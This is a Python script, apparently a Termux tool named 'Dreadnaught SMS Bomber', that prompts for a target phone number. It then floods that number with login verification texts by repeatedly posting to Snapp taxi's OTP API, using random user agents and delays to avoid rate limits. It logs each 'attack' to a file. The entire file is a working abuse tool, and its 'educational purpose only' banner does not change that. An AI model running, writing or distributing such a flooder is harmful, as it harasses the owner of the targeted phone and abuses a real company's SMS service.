#!/usr/bin/env python3

import requests
import time
import random
import os
import sys

# تنظیمات اولیه برای ترمینال
if sys.platform != 'win32':
    os.system('clear')

# متغیرهای رنگی برای ترمینال
R = "\033[91m"  # قرمز
G = "\033[92m"  # سبز
Y = "\033[93m"  # زرد
B = "\033[94m"  # آبی
P = "\033[95m"  # بنفش
C = "\033[96m"  # فیروزه‌ای
W = "\033[97m"  # سفید
BR = "\033[1m"  # پررنگ
RS = "\033[0m"  # ریست

# نمایش بنر ساده
def show_banner():
    print(f"""{P}{'='*60}{RS}
{R}{BR}
██████╗ ██████╗ ███████╗ █████╗ ██████╗ ███╗   ██╗ █████╗ ██╗   ██╗ ██████╗ ██╗  ██╗████████╗
██╔════╝ ██╔══██╗██╔════╝██╔══██╗██╔══██╗████╗  ██║██╔══██╗██║   ██║██╔════╝ ██║  ██║╚══██╔══╝
██║  ███╗██████╔╝█████╗  ███████║██║  ██║██╔██╗ ██║███████║██║   ██║██║  ███╗███████║   ██║   
██║   ██║██╔══██╗██╔══╝  ██╔══██║██║  ██║██║╚██╗██║██╔══██║██║   ██║██║   ██║██╔══██║   ██║   
╚██████╔╝██║  ██║███████╗██║  ██║██████╔╝██║ ╚████║██║  ██║╚██████╔╝╚██████╔╝██║  ██║   ██║   
 ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
{RS}
{Y}    D R E A D N A U G H T   S M S   B O M B E R{RS}
{C}        Termux Version - V4.0{RS}
{P}{'='*60}{RS}
{G}
[+] Developer: MR_Bigmasoud
[+] Platform: Termux
[+] Version: 4.0
[+] Channel: Dreadnaught@ Rubika
[!] For Educational Purpose Only{RS}
{R}
[!] Warning: Illegal Use is Prohibited
[!] User Responsibility{RS}
{P}{'='*60}{RS}""")

# بررسی و نصب کتابخانه‌ها
def install_libs():
    print(f"{Y}[*] Checking libraries...{RS}")
    
    libs = ['requests', 'fake-useragent']
    for lib in libs:
        try:
            __import__(lib.replace('-', '_'))
            print(f"{G}[+] {lib} installed{RS}")
        except:
            print(f"{R}[-] {lib} not found, installing...{RS}")
            os.system(f"pip install {lib} --quiet")

# انیمیشن لودینگ
def loading(t, msg=""):
    ani = "|/-\\"
    for i in range(t * 10):
        time.sleep(0.1)
        sys.stdout.write(f"\r{C}{ani[i % len(ani)]} {msg}{RS}")
        sys.stdout.flush()
    print()

# ارسال درخواست SMS
def send_sms(phone):
    try:
        from fake_useragent import UserAgent
        ua = UserAgent()
        
        url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
        
        headers = {
            'User-Agent': ua.random,
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Accept-Language': 'fa-IR',
            'Origin': 'https://app.snapp.taxi',
            'Referer': 'https://app.snapp.taxi/login'
        }
        
        data = {"cellphone": phone, "optionalClient": "PASSENGER", "otpOption": "SMS"}
        
        print(f"{B}[>] Sending request...{RS}")
        loading(1, "Sending SMS")
        
        r = requests.post(url, json=data, headers=headers, timeout=10)
        
        if r.status_code == 200:
            print(f"{G}[+] SMS Sent Successfully! (Status: 200){RS}")
            return "success"
        elif r.status_code == 429:
            print(f"{Y}[!] Rate Limit (Status: 429){RS}")
            return "limit"
        elif r.status_code == 403:
            print(f"{R}[!] Blocked (Status: 403){RS}")
            return "blocked"
        else:
            print(f"{P}[?] Status: {r.status_code}{RS}")
            return "error"
            
    except requests.exceptions.Timeout:
        print(f"{R}[!] Timeout{RS}")
        return "timeout"
    except Exception as e:
        print(f"{R}[!] Error: {str(e)[:50]}{RS}")
        return "error"

# اجرای اصلی
def main():
    show_banner()
    install_libs()
    
    print(f"\n{Y}{'='*50}{RS}")
    
    # دریافت شماره
    while True:
        try:
            phone = input(f"{C}[?] Target Phone (09xxxxxxxxx): {RS}").strip()
            if phone.startswith('09') and len(phone) == 11:
                break
            else:
                print(f"{R}[!] Invalid phone number!{RS}")
        except:
            phone = "09123456789"  # پیش‌فرض برای تست
    
    print(f"{Y}{'='*50}{RS}")
    print(f"{R}[+] Target: {phone}{RS}")
    print(f"{Y}[+] Delay: 3-5 seconds{RS}")
    print(f"{R}[+] Stop: Ctrl+C{RS}")
    print(f"{Y}{'='*50}{RS}")
    
    count = 1
    success = 0
    
    try:
        while True:
            print(f"\n{P}{'-'*40}{RS}")
            print(f"{BR}[~] Attack #{count}{RS}")
            print(f"{C}[+] Time: {time.strftime('%H:%M:%S')}{RS}")
            
            result = send_sms(phone)
            
            # ذخیره لاگ
            with open("attack_log.txt", "a") as f:
                f.write(f"{time.ctime()} | Attack: {count} | Target: {phone} | Result: {result}\n")
            
            if result == "success":
                success += 1
            
            # نمایش آمار هر 5 بار
            if count % 5 == 0:
                print(f"\n{B}{'*'*30}{RS}")
                print(f"{BR}[+] STATS:{RS}")
                print(f"{G}[+] Total: {count}{RS}")
                print(f"{G}[+] Success: {success}{RS}")
                print(f"{B}{'*'*30}{RS}")
            
            # تاخیر تصادفی
            delay = random.uniform(3, 5)
            print(f"{C}[~] Waiting {delay:.1f} seconds...{RS}")
            time.sleep(delay)
            
            count += 1
            
    except KeyboardInterrupt:
        print(f"\n\n{R}{'!'*20}{RS}")
        print(f"{R}[!] Attack Stopped!{RS}")
        print(f"{Y}{'='*50}{RS}")
        print(f"{G}[+] Total Attacks: {count-1}{RS}")
        print(f"{G}[+] Successful: {success}{RS}")
        print(f"{C}[+] Log saved: attack_log.txt{RS}")
        print(f"{P}[+] Developer: MR_Bigmasoud{RS}")
        print(f"{Y}{'='*50}{RS}")
        
        # ارسال نوتیفیکیشن
        try:
            os.system(f'termux-notification -t "Attack Finished" -c "Attacks: {count-1}\nSuccess: {success}"')
        except:
            pass

# شروع برنامه
if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"{R}[!] Fatal Error: {e}{RS}")